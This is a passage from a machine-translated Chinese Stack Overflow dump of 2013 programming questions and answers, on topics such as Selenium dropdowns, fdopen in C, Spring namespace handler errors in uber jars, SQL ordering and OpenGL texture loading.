                <input type="text" autocomplete="off" style="width: 78px;">
            </div>
            <ul class="chzn-results">
                <li id="sel2DZ_chzn_o_1" class="active-result result-selected" style="">demo</li>
                <li id="sel2DZ_chzn_o_2" class="active-result" style="">demo download</li>
            </ul>
        </div>
    </div>
</div> 
```

关于如何使用 Ruby WebDriver 设置此下拉列表的值的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T14:59:55.927

我使用 Python API，但我认为您应该了解这种方法。这是我在测试中使用的方法。所以我实际上点击了链接，等待下拉菜单显示，点击选项。

```
def select_random_js_dropdown_option(driver, link_to_call_dropdown_xpath, dropdown_option_xpath):
    options = driver.find_elements_by_xpath(dropdown_option_xpath) 
    driver.find_element_by_xpath(link_to_call_dropdown_xpath).click()
    wait_for_element_to_load(driver, dropdown_option_xpath)
    random.choice(options).click()

def wait_for_element_to_load(driver, element_xpath, time_to_wait):
    try:
        return WebDriverWait(driver, time_to_wait).until(lambda driver : driver.find_element_by_xpath(element_xpath).is_displayed())
    finally:
        pass 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T21:39:34.890

这就是我使用 ruby​​ 与下拉菜单交互的方式

```
Selenium::WebDriver::Support::Select.new(@driver.find_element(:name, name)).select_by(:text, data_to_select) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-08T13:14:30.673

javascript 只是与隐藏的下拉菜单交互，因此您可以使用以下命令取消隐藏实际下拉菜单：

```
@driver.execute_script("document.getElementsByName('#{<REF_TO_HIDDEN_DROPDOWN}')[0].style.display = 'block'") 
```

这会将隐藏下拉菜单的显示设置为“阻止”，以便您可以正常与之交互。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-22T01:34:25.053

这就是我从 Ruby 的下拉列表中选择的方式： -

```
option = Selenium::WebDriver::Support::Select.new(browser.find_element(:id => "00NZ0000001G35y")
)
option.select_by(:text, "Mumbai") 
```

希望对你有帮助！

# java - 如何更新 Couchbase 系统日期？

> ID：15110635
> 
> 赞同：0
> 
> 时间：2013-02-27T11:12:55.943
> 
> 标签：java, linux, couchbase

我需要更新 Couchbase 集群和/或存储桶的系统日期（目前没有太大区别）。在 SQL DB 中执行此操作相对容易，但我不知道在哪里查找以及如何在 Couchbase 中执行此操作。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-22T15:18:04.427

由于 CB 使用操作系统 sysdate，我要求的举动将涉及篡改；这在 Linux 系统上风险太大（也不会在 MS 上尝试）。

我想这将永远结束调查。

# ios - iOS：将 png 图像转换为 1 位 bmp 图像

> ID：15110637
> 
> 赞同：0
> 
> 时间：2013-02-27T11:12:57.047
> 
> 标签：ios, objective-c, png, bmp, image-conversion

我的要求是将 png 文件转换为 1 位单色位图文件。我有一个 UIImage 对象，我想将其表示为 1 位单色 bmp。

1）有没有直接的方法来做到这一点？我准备从头开始做这件事，但前提是没有任何现成的解决方案可用。我浏览了 Core graphics 和 Core image framework，但找不到任何相关的东西。或者是否有任何可用的开源项目可以实现这一点？

2）如果我必须手动执行此操作，我对保存像素的位表示有些怀疑。[我在这里](http://en.wikipedia.org/wiki/BMP_file_format)找到了 bmp 文件格式。

1.  按照文件格式创建位图标题。我不确定是否所有 bmp 版本（1 位、8 位等）都具有相同的标头格式。找不到任何相关信息。
2.  遍历png图像的所有像素，得到红、绿、蓝（RGB）的字节值。对这 3 个值进行一些计算，以获得 1 位表示。例如像（伪代码）

    ```
    for(each pixel){
        average  = (pixel.RValue + pixel.GValue + pixel.BValue)/3;
        if(average > 0x7f) //127
             bit  = 1;
        else
             bit  = 0;
        //bit has monochrome representation for this pixel, but how to store it?
    } 
    ```

3.  将这些位附加到您已经创建的 bmp 标头中。

我知道如何遍历 png 图像中的每个像素，因此我可以获得该像素的单色表示。我也认为我可以做标题部分，即使我还没有做过。但我不知道如何处理位。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T16:49:08.707

> 有没有直接的方法可以做到这一点？我准备从头开始做这件事，但前提是没有任何现成的解决方案可用。

我不能告诉你是否有现成的解决方案可以在 iOS 中编写 BMP，但我可以告诉你，BMP 是少数几种相对容易从头开始编写的格式之一。

> 按照文件格式创建位图标题。我不确定是否所有 bmp 版本（1 位、8 位等）都具有相同的标头格式。找不到任何相关信息。

维基百科的文章信息量很大。所有 BMP 类型的 header 格式基本相同，bitdepth 存储在 offset 中`1Ch`

> 遍历png图像的所有像素，得到红、绿、蓝（RGB）的字节值。对这 3 个值进行一些计算，以获得 1 位表示。例如...将这些位附加到您已经创建的 bmp 标头中。

听起来不错。不要忘记行可能需要一些[填充](http://en.wikipedia.org/wiki/BMP_file_format#Pixel_storage)

> 但我不知道如何处理位

只需将一组[八位封装在一个字节](https://stackoverflow.com/questions/8461126/creating-a-byte-out-of-8-bool-values-and-vice-versa)中。

# business-objects - 使用远程数据库的 Business Objects Universe 性能

> ID：15110639
> 
> 赞同：1
> 
> 时间：2013-02-27T11:13:02.273
> 
> 标签：business-objects

我的公司正在考虑将 Business Objects 用于报告目的，因为我们的母公司已经购买了许可证。

**情景**

*   站点 A 上的 1 个大型数据库 (20+gb)
*   安装在站点 B（100 英里外）上的业务对象
*   站点 A 和站点 B 之间的 10Mb 线路
*   站点 A 的用户希望使用站点 B 的业务对象宇宙设置报告他们的实时数据

在不了解如何设置 Business Objects 和 Universe 的情况下，考虑到数据库的大小和必须存储的数据量，我无法看到在一个站点上运行包含数据并在另一个站点上运行 Business Objects 的报告会起作用通过电线查询。

我有两个问题：

1.  建议的方案是否可以配置？
2.  Business Objects 将如何处理存储在远程服务器上的数据（如果有的话）？

**更新：**

我们每 3 小时运行一次实时数据库的备份，因此理论上我们可以在一夜之间将数据库从站点 A 复制到站点 B，或者如果需要更频繁地复制，但我仍然不确定通过网络运行报告对性能的影响。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T10:37:07.017

在 Business Objects 中，您有三层（按以下顺序排列 - 从上到下）：报告、Universe、连接和数据源（我看到的大多数情况是 ODBC 驱动程序）。您将数据库连接（SQL、Oracle 或任何 DBMS 连接）定义为站点 A（应用程序层）上的 ODBC，并使用 ODBC 连接到位于站点 B 中的数据库的数据库。

可能发生的性能问题与数据库中的数据量无关。它实际上取决于报告中“查询”的数据量。我相信您需要创建一个试点报告，并尝试从您的数据源中获取一些样本综合大数据作为概念证明。

我们的架构与您提到的应用于我们公司的架构相同。我们在站点 A 中有多个报告，并从不同站点/位置的多个数据库中获取数据（但是站点 A 和站点 B 都在同一个网络上）。我们还与 MySQL、Oracle 和 SQL Server 等多个 DBMS 合作。尽管我们没有您提到的数据量，但在运行报告时我们看不到对性能的明显影响。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T23:27:53.210

根据我们的经验，BusinessObjects 对数据库的访问与任何其他 SQL 访问没有什么不同。InfoView 应用程序甚至会显示报表将执行的 SQL。当我们怀疑报表的性能时，我们经常复制该 SQL 并将其粘贴到 SQL Server Management Studio 中，并完全在 BusinessObjects 之外对查询进行分析。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T12:06:45.667

这里没有业务对象产品的具体知识，但无论使用哪种报告工具，您最好在一夜之间扁平化和推送数据集，准备在第二天报告，或者如果每天一次，则可能在全天的设定点不够。

允许用户对实时数据集运行可能复杂且耗时的查询会给实时系统带来很大压力。

我们在一个国家系统上遇到了这个问题，并通过在 SQL Server 中运行通宵作业来解决这个问题，该作业将数据展平（基本上不需要连接表）并将其导出到单独的服务器，报告工具将连接到该服务器 -它基本上是数据仓库。

如果企业坚持认为他们需要报告中的“最新”数据，那么您需要提出更好的基础架构来支持这一点，并与企业合作以找出其对他们的价值。

# c - 如何使用相同的模式和标志打开 fdopen？

> ID：15110642
> 
> 赞同：5
> 
> 时间：2013-02-27T11:13:06.940
> 
> 标签：c, file-io, printf, fdopen

我想有一种`FILE*`可以使用的类型`fprintf`。我需要使用`fdopen`来获取 a`FILE*`而不是`open`返回一个`int`. 但是我们可以用`fdopen`and做同样的事情`open`吗？（我没用过`fdopen`）

我想做一个`fdopen`与以下内容相同的事情：

```
open("my_file", 0_CREAT | O_RDWR | O_TRUNC, 0644); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-27T11:16:31.277

`fdopen`接受一个可能由 先前返回的文件描述符`open`，所以这不是问题。

只是`open`您的文件获取描述符，然后`fdopen`是该描述符。

`fdopen``read`只需创建一个用户空间缓冲流，采用支持and`write`操作的任何类型的描述符。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-27T11:15:33.683

## `fdopen()`使用文件描述符指向文件指针：

该[`fdopen()`](http://pubs.opengroup.org/onlinepubs/009604499/functions/fdopen.html)函数将流与文件描述符相关联。文件描述符从`open()`、`dup()`、`creat()`或获得`pipe()`，它们打开文件但不返回指向`FILE`结构流的指针。流是几乎所有 stdio 库例程的必要输入。

```
FILE* fp = fdopen(fd, "w"); 
```

此示例代码可能会在您想要使用时为您提供更多帮助`fprintf()`：

```
int main(){
 int fd;
 FILE *fp;
 fd = open("my_file",O_WRONLY | O_CREAT | O_TRUNC);
  if(fd<0){
    printf("open call fail");
    return -1;
 }
 fp=fdopen(fd,"w");
 fprintf(fp,"we got file pointer fp bu using File descriptor fd");
 fclose(fp);
 return 0;
} 
```

**注意：**

*   流的模式必须与文件描述符的模式兼容。
*   当流通过 关闭时`fclose()`， fd 也关闭。ref：[该`fclose()`函数`close()`对与stream指向的流相关联的文件描述符执行a。](http://www.mkssoftware.com/docs/man3/fclose.3.asp)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:18:48.263

如果您之前没有为您的文件获取文件描述符，请使用`fopen`.

```
FILE* file = fopen("pathtoyourfile", "w+"); 
```

考虑一下，这`fopen`是使用标准库调用而不是系统调用（打开）。所以你没有那么多选项（比如指定访问控制值）。

请参阅[手册页](http://linux.die.net/man/3/fdopen)。

# android - tabActivity中左右滑动动画

> ID：15110648
> 
> 赞同：0
> 
> 时间：2013-02-27T11:13:18.627
> 
> 标签：android, animation, tabactivity

我想提供与 Sherlock 操作栏相同的滑动（左右）功能，我如何在 TabActivity 中实现它。我已经实现了 onfling() 但无法实现这里是代码

```
 package com.restaurantapp.pkg;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.os.Bundle;
import android.util.Log;
import android.view.GestureDetector;
import android.view.GestureDetector.SimpleOnGestureListener;
import android.view.MotionEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ViewFlipper;

public class ListViewImagesActivity extends Activity {

    private Cursor food_items;
    public String item_name;
    private String item_descrp;
    private String item_price;
    public Object o;
    private ArrayList<ItemDetails> image_details;
    private String categoryid;
    public int pos;
    private String item_id;
    private SQLiteDatabase db;
    private String category_name_id;
    public Dialog dialog;
    public ViewFlipper viewFlipper;
    public Animation slideLeftIn;
    public Animation slideLeftOut;
    public Animation slideRightIn;
    public Animation slideRightOut;

    public static final int SWIPE_MIN_DISTANCE = 120;

    public static final int SWIPE_MAX_OFF_PATH = 250;

    public static final int SWIPE_THRESHOLD_VELOCITY = 200;

    public GestureDetector gestureDetector;

    View.OnTouchListener gestureListener;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED);
        setContentView(R.layout.foodlist_menu);

        Bundle extra = getIntent().getExtras();
        categoryid = extra.getString("categoryId");
        category_name_id = extra.getString("main_categoryId");
        Log.d("category name intent", category_name_id);

        // ----------Animation Files
        viewFlipper = (ViewFlipper) findViewById(R.id.flipper);
        slideLeftIn = AnimationUtils.loadAnimation(this, R.anim.slide_left_in);
        slideLeftOut = AnimationUtils
                .loadAnimation(this, R.anim.slide_left_out);
        slideRightIn = AnimationUtils
                .loadAnimation(this, R.anim.slide_right_in);
        slideRightOut = AnimationUtils.loadAnimation(this,
                R.anim.slide_right_out);

        gestureDetector = new GestureDetector(new MyGestureDetector());
        gestureListener = new View.OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                if (gestureDetector.onTouchEvent(event)) {
                    return true;
                }
                return false;
            }
        };
        getFoodItems();
        image_details = GetSearchResults();
        // View on which gesture should function This is image view at bottom of
        // listView on which flip gesture is performed.

        final ListView lv1 = (ListView) findViewById(R.id.listV_main);
        lv1.setOnTouchListener(gestureListener);
        lv1.setAdapter(new ItemListBaseAdapter(this, image_details));

    public class MyGestureDetector extends SimpleOnGestureListener {
        @Override
        public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX,
                float velocityY) {
            try {
                if (Math.abs(e1.getY() - e2.getY()) > SWIPE_MAX_OFF_PATH)
                    return false;
                // right to left swipe
                if (e1.getX() - e2.getX() > SWIPE_MIN_DISTANCE
                        && Math.abs(velocityX) > SWIPE_THRESHOLD_VELOCITY) {
                    viewFlipper.setInAnimation(slideLeftIn);
                    viewFlipper.setOutAnimation(slideLeftOut);
                    viewFlipper.showNext();
                    Toast.makeText(ListViewImagesActivity.this, "Left Swipe",
                            Toast.LENGTH_SHORT).show();

                } else if (e2.getX() - e1.getX() > SWIPE_MIN_DISTANCE
                        && Math.abs(velocityX) > SWIPE_THRESHOLD_VELOCITY) {
                    viewFlipper.setInAnimation(slideRightIn);
                    viewFlipper.setOutAnimation(slideRightOut);
                    viewFlipper.showPrevious();
                    Toast.makeText(ListViewImagesActivity.this, "Right Swipe",
                            Toast.LENGTH_SHORT).show();
                }
            } catch (Exception e) {
                // nothing
            }
            return false;
        }
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        if (gestureDetector.onTouchEvent(event))
            return true;
        else
            return false;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:41:00.483

使用 Fragments 会如你所愿 [滑动](http://developer.android.com/training/implementing-navigation/lateral.html#swipe-tabs)

# git - git在带有@符号的文件夹中添加文件-致命：不是git存储库

> ID：15110649
> 
> 赞同：2
> 
> 时间：2013-02-27T11:13:22.623
> 
> 标签：git, github

我想添加名称中带有 @ 符号的文件夹。由于程序限制，我无法重命名它们，但我也不能将它们添加到我的 github 存储库中。

文件夹名称是：

```
zoteroOpenOfficeIntegration@zotero.org
zoteroWinWordIntegration@zotero.org 
```

git错误消息是：

```
G:\PortableApps\PortableApps\GitPortable\Data\home\github\PortableApps>git status
# On branch master
# Untracked files:
#   (use "git add <file>..." to include in what will be committed)
#
#       Zotero Standalone/
nothing added to commit but untracked files present (use "git add" to track)

G:\PortableApps\PortableApps\GitPortable\Data\home\github\PortableApps>git add "
Zotero Standalone"
fatal: Not a git repository: Zotero Standalone/ZoteroStandalonePortable/App/Zote
ro Standalone/extensions/zoteroWinWordIntegration@zotero.org/../../.git/modules/
modules/zotero-word-for-windows-integration 
```

是否有任何解决方案可以将带有 @ 符号的文件夹中的文件添加到 git 存储库？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:36:29.080

您看到的错误与`@`文件夹中的字符无关，而是与您尝试将存储库添加到另一个存储库的事实有关。相反，您应该将其添加为子模块。

# c++ - 是否有任何带有 mingw 的 Netbeans 或 Eclipse C++ 可移植？

> ID：15110652
> 
> 赞同：0
> 
> 时间：2013-02-27T11:13:27.433
> 
> 标签：c++, netbeans, portable-applications

我正在寻找带有 C++ 插件和 MinGW 的 Netbeans 或 Eclipse Portable 版本，我想把它放在一个 pendrive 上，并且不必设置任何东西，但如果我做的唯一设置是添加 MinGW 的 PATH，我没有任何问题关于windows的环境设置

我在网上寻找，但没有找到任何解决方案，我不想使用“代码块”或 DevCpp

我之前在 Netbeans + MinGW 方面有过很好的体验，所以这是我的第一选择

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:23:20.570

t 在 Eclipse 中更自然地设置工具链。但是，您可以尝试例如**Wascana**。

# triggers - 使用 CMD 批处理脚本执行时，什么可能导致 cleartool.exe 崩溃？

> ID：15110654
> 
> 赞同：1
> 
> 时间：2013-02-27T11:13:31.043
> 
> 标签：triggers, runtime-error, cleartool

我有一个批处理脚本，它在被操作触发后调用`cleartool`以执行命令。调用的结果被写入输出文件。我的批次中的行是：`lsactivity``checkin`

```
cleartool lsactivity -long "%ACTIVITY%">streaminfo_%timestamp%.txt 
```

where`%timestamp%`是一个包含日期和时间的变量，使每个调用都是唯一的。

98%的时间我没有问题。然而，剩下的 2% 是 cleartool 崩溃并留下一个锁定的 0KB 文件，导致 CMD 脚本挂起，直到使用 Sysinternals Process Explorer 关闭。

浏览操作系统（Win 2003 Server）系统事件查看器后，我发现[这条消息](http://i.imgur.com/WdZFxDZ.png)对应于给被阻止文件的时间戳，并且被归类为信息而不是错误：

```
Application popup: Microsoft Visual C++ Runtime Library : Runtime Error!

Program C:\Program Files\Rational\ClearCase\bin\cleartool.exe

This application has requested the Runtime to terminate it in an unusual way. 
```

以前有没有其他人遇到过这个问题，或者有什么建议可以解决，或者为什么会发生？

[IBM 论坛上的这个](http://www.ibm.com/developerworks/forums/thread.jspa?messageID=14529023)帖子是关于同一问题的，但尚未得到答复。

任何反馈将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:37:47.083

Pending a definitive answer for the root cause of the cleartool crash (like this [cc-cq link](http://www-01.ibm.com/support/docview.wss?uid=swg21321509)), I would set a Windows job which would:

*   monitor for any 0kb file in the directory used by your trigger script to write its files
*   kill the trigger process and relaunch it.

# android - Android 持久化包？

> ID：15110657
> 
> 赞同：-6
> 
> 时间：2013-02-27T11:13:39.747
> 
> 标签：android, database, datapersistance

我想像在 Java EE 中一样轻松实现数据库连接，是否有可以提供帮助的库？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:15:00.727

你可以试试 ActiveAndroid，它是开源的，易于实现 :)

[https://www.activeandroid.com/](https://www.activeandroid.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:17:42.183

查看 ORMLite，它工作得很好 - [http://ormlite.com/](http://ormlite.com/)

# javascript - 在 Grails 的 params 属性中使用 JavaScript

> ID：15110666
> 
> 赞同：1
> 
> 时间：2013-02-27T11:13:54.273
> 
> 标签：javascript, grails, params

我希望有人可以提供帮助。

我有以下不被接受的代码：

```
<g:link title="Periodendaten speichern" action="speicherePeriodendaten" params="'\'pStart=\' + $('#periodeStart'${i}').value'" id="${zwzPeriode.id}"> 
```

使用 $('#periodeStartX')，我试图获取 ID 为 periodeStartX 的 DOM 元素，其中 X 是 i 的当前值。i 来自 ag:each-Tag (status=i)

我知道以下是有效的：

```
<g:link title="Periodendaten speichern" action="speicherePeriodendaten" params="'\'pStart=\' + this.value'" id="${zwzPeriode.id}"> 
```

但是在上面的场景中，我不想拥有当前Tag的值，我想要另一个Tag的值。

因此，我的问题是，我不明白如何正确地在这里逃脱。

我会很感激任何好的提示。

最好的问候，迈克尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:37:31.713

下面的另一种方法：

```
<r:require module="jquery"/>

<input id="periodeStart1" value="V1" />
<input id="periodeStart2" value="V2" />

<%-- Sample variables --%>
<g:set var="i" value="1" />
<g:set var="id" value="42" />               

<%-- Resolve pStart "onclick" event --%>                
<a href="${createLink(action: 'speicherePeriodendaten', params: [id: zwzPeriode.id])}" onclick="this.href=this.href+'?pStart='+$('#periodeStart${i}').val()">Sample Link</a> 
```

Edit1：另外，您可能应该用 encodeURIComponent() 包装 $('#periodeStart${i}').val()。以防万一。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:41:11.203

您需要转义 $ 符号，因为 Groovy 会尝试将其视为表达式：

```
<g:link title="Periodendaten speichern" action="speicherePeriodendaten" params="'\'pStart=\' + \$('#periodeStart'${i}').value'" id="${zwzPeriode.id}"> 
```

# php - 自定义、动态定价 Magento

> ID：15110667
> 
> 赞同：1
> 
> 时间：2013-02-27T11:13:54.903
> 
> 标签：php, magento, e-commerce

我即将着手扩展 Magento 以允许通过一系列可配置选项以当前实施的更强大的方式计算产品价格，例如基于宽度 x 高度 + 可选功能 x 面积等。

我正在考虑使用`Event/Observer`来完成此操作，但我只是想知道a）这是否存在任何安全隐患以及b）它是否被认为是最佳实践？我确信这个功能是相当成熟的，所以如果有人有推荐的方法来实现它，我将非常感激，因为我对 Magento 并不熟悉。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-03T13:42:14.593

您可以通过绑定到 checkout_cart_product_add... 和 checkout_cart_product_update... 事件轻松做到这一点，请记住，如果您使用多种货币，则在用户切换货币后不会重新计算自定义价格。您必须在观察者中自己处理货币转换。

# c# - zedgraph 不会将更改应用到 myPane

> ID：15110668
> 
> 赞同：0
> 
> 时间：2013-02-27T11:13:55.797
> 
> 标签：c#, zedgraph

我正在尝试创建我的数据的可视化表示，我已经填充了点对列表，并且我正在创建我的图表，如下所示：

```
public void CreateChart(ZedGraphControl zgc)
    {
        GraphPane myPane = zgc.GraphPane;

        //set the title and axis labels
        myPane.Title.Text = "Graph";
        myPane.XAxis.Title.Text = "Width";
        myPane.YAxis.Title.Text = "Height";

        //create curves
        BarItem myCurve = myPane.AddBar("1", pointPairList1, Color.Blue);
        BarItem myCurve2 = myPane.AddBar("2", pointPairList2, Color.Red);

        zgc.AxisChange();

    } 
```

当我调用 CreateChart(chart1) 方法时，图表没有任何更改，甚至标题也没有更新。有人能发现我的错误吗？

回答：

```
 chart1.AxisChange();
        chart1.Invalidate();
        chart1.Refresh(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T18:56:27.690

尝试

```
 zgc.refresh(); 
```

或者

```
 zgc.invalidate(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:27:48.260

创建一个事件`ZedGraphWeb1_RenderGraph`，然后将所有代码放入该块中。

# spring - 无法找到 Spring NamespaceHandler 错误

> ID：15110671
> 
> 赞同：18
> 
> 时间：2013-02-27T11:14:07.873
> 
> 标签：spring, xml-namespaces

我已经有这个错误将近一个星期了，我正准备放弃。我已经使用 Maven2 制作了 BIG jar 文件。当我使用以下命令运行 jar 文件时：

```
 java -jar someJar.jar 
```

我收到此错误：

```
 ERROR: [27/55/13 10:55] Launcher: org.springframework.beans.factory.parsing.BeanDefinitionParsingException: Configuration problem: Unable to locate Spring NamespaceHandler for XML schema namespace [http://www.springframework.org/schema/context]
 Offending resource: class path resource [JavaProjectApplicationContext.xml] 
```

JavaProjectApplicationContext.xml 如下：

```
 <?xml version="1.0" encoding="UTF-8"?>

<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:context="http://www.springframework.org/schema/context"
   xmlns:jee="http://www.springframework.org/schema/jee"
   xsi:schemaLocation="http://www.springframework.org/schema/beans 
       http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
       http://www.springframework.org/schema/context
       http://www.springframework.org/schema/context/spring-context-3.0.xsd
       http://www.springframework.org/schema/jee
       http://www.springframework.org/schema/jee/spring-jee-3.0.xsd"> 

<bean id="placeholderConfig" class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
<property name="location"><value>deployment.properties</value></property>
</bean>

<bean id="LexEditorDataSource" class="org.apache.commons.dbcp.BasicDataSource">
<property name="driverClassName"><value>${hibernate.jdbc_driver}</value></property>
<property name="username"><value>${hibernate.username}</value></property>
<property name="password"><value>${hibernate.password}</value></property>
<property name="url"><value>${hibernate.url}</value></property>
<property name="defaultAutoCommit"><value>${hibernate.default_auto_commit}</value>   </property>
<property name="maxActive"><value>20</value></property>
<property name="maxIdle"><value>3</value></property>
 <property name="testOnBorrow"><value>true</value></property>
<property name="testOnReturn"><value>true</value></property>
<property name="testWhileIdle"><value>true</value></property>
</bean>

 <context:component-scan base-package="com.k_int.bank.plugin">
    <context:include-filter type="annotation" expression="org.springframework.stereotype.Service"/>
 </context:component-scan>

  <bean id="ThesSessionFactory" class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean">
   <property name="dataSource"><ref local="LexEditorDataSource"/></property>
  <property name="configurationClass">  <value>org.hibernate.cfg.AnnotationConfiguration</value></property> 
   <property name="packagesToScan">
        <list>
            <value>com.bank.kernel.datamodel</value>              
        </list>
</property>
<property name="annotatedClasses">
  <list>
    <!-- identity service -->
    <value>com.svc.identity.datamodel.PartyHDO</value>
    <value>com.svc.identity.datamodel.RegisteredUserHDO</value>
    <value>com.svc.identity.datamodel.AuthenticationDetailsHDO</value>
    <value>com.svc.identity.datamodel.GrantHDO</value>
    <value>com.svc.identity.datamodel.PermissionHDO</value>
    <value>com.svc.identity.datamodel.RegisteredOrganisationHDO</value>
    <value>com.svc.identity.datamodel.RoleHDO</value>
   </list>
</property>
  <property name="hibernateProperties">
   <props>
    <prop key="hibernate.dialect">${hibernate.dialect}</prop>
    <prop key="hibernate.hbm2ddl.auto">${hibernate.hbm2ddl.auto}</prop>
    <prop key="hibernate.show_sql">false</prop>       
  </props>
  </property>
 </bean>
  <bean id="IndexService" class="com.k_int.bank.index.solr_impl.SOLRIndexService" init-method="init">
  <property name="indexDirectory"><value>${com.bank.index_dir}</value></property>
  <property name="indexPropertyFile"><value>solr.properties</value></property>
  </bean> 
```

到目前为止我已经尝试过的事情。

以 3 种不同的方式构建项目（2 个 IDE 和命令行）删除了任何 jar 依赖冲突（我有 spring-2.5.6.jar 和 spring-context-3.0.5.RELEASE.jar，所以我删除了 spring-2.5.6 。罐）

将 [http://www.springframework.org/schema/beans/spring-beans-2.5.xsd](http://www.springframework.org/schema/beans/spring-beans-2.5.xsd)更改为 [http://www.springframework.org/schema/beans/spring-beans-3.0.xsd](http://www.springframework.org/schema/beans/spring-beans-3.0.xsd)。

这些更改都没有消除错误。

在汽车文件中存在

```
 someJar.jar/org/springframework/context/config/ContextNameSpaceHandler.class 
```

有没有人有任何想法。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-02-27T12:05:53.280

很可能发生的事情是向 Spring 提供有关自定义命名空间处理程序（spring.schema、spring.handlers）位置的元数据的文件在您创建 big(uber) jar 时最终相互覆盖。

为了更清楚地说明这一点，如果您使用上下文名称空间，例如 - `context:property-placeholder-configurer`，有关如何解析此名称空间的信息是在文件中使用 spring.handlers 文件`spring-context.jar!:/META-INF/spring.handlers`，其他自定义名称空间支持的其他 spring jar 文件中存在类似文件. 现在，当您创建 Uber jar 时，由于处理程序文件的位置完全相同，一个 spring.handler 文件最终会覆盖其他文件，您会看到您所看到的错误。这里描述了一些潜在的修复，其中建议了一些创建可执行 jar 的替代方法：

[如何使用 maven 创建基于 spring 的可执行 jar？](https://stackoverflow.com/questions/11160534/how-to-create-spring-based-executable-jar-with-maven)

# sql - 值 DK 在 D 之前的第一个订单，然后是使用案例的值的数字部分

> ID：15110672
> 
> 赞同：1
> 
> 时间：2013-02-27T11:14:08.237
> 
> 标签：sql, database

我需要使用以下规则订购一些值：

*   在 D 之前以 DK 开头的值
*   按字母顺序在这两组中排序

所以这些值看起来像：

*   DK207
*   D107
*   DK107
*   D099

他们希望最终得到：

*   DK107
*   DK207
*   D099
*   D107

我目前的尝试：

```
select *
from customers
order by case
    WHEN substring(code,1,2) = 'DK' then substring(code,1,2)
    WHEN substring(code,1,1) = 'D' then substring(code,1)
END desc,
case
    WHEN substring(code,1,2) = 'DK' then substring(code,3)
    WHEN substring(code,1,1) = 'D' then substring(code,2)
END asc; 
```

对于 DK 值，这似乎工作正常，但对于以 D 开头的值则混乱。它们被正确分组，但带有 D 的值似乎是按降序排序的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:27:31.993

在指示的地方添加`,1`。

否则你会拿走一切。

```
select *
from customers
order by case
    WHEN substring(code,1,2) = 'DK' then substring(code,1,2)
    WHEN substring(code,1,1) = 'D' then substring(code,1,1)    <----- Importanat change!!!
END desc,
case
    WHEN substring(code,1,2) = 'DK' then substring(code,3)
    WHEN substring(code,1,1) = 'D' then substring(code,2)
END asc; 
```

[SQL小提琴](http://sqlfiddle.com/#!2/d66ee/2)

# opengl - OpenGL纹理搞砸了

> ID：15110677
> 
> 赞同：0
> 
> 时间：2013-02-27T11:14:24.073
> 
> 标签：opengl

这是我加载纹理的代码。我尝试使用此示例加载文件；它是一个 gif 文件。请问能不能加载gif文件，还是只能加载raw文件？

```
void setUpTextures()
{

    printf("Set up Textures\n");
    //This is the array that will contain the image color information.
    // 3 represents red, green and blue color info.
    // 512 is the height and width of texture.
    unsigned char earth[512 * 512 * 3];

    // This opens your image file.
    FILE* f = fopen("/Users/Raaj/Desktop/earth.gif", "r");
    if (f){
        printf("file loaded\n");
    }else{
        printf("no load\n");
        fclose(f);
        return;
    }

    fread(earth, 512 * 512 * 3, 1, f);
    fclose(f);

    glEnable(GL_TEXTURE_2D);

    //Here 1 is the texture id
    //The texture id is different for each texture (duh?)
    glBindTexture(GL_TEXTURE_2D, 1);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST);
    //In this line you only supply the last argument which is your color info array,
    //and the dimensions of the texture (512)
